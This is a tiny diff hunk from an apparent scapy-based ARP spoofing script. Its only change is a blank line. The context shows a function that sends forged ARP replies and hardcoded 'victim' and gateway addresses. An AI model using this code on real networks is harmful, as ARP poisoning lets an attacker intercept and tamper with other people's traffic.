@@ -17,6 +17,7 @@ def spoof_target(target_ip,target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
     scapy.send(packet)
 
+
 victim_ip = "10.0.0.74"
 gtw_ip    = "10.0.0.1"
 
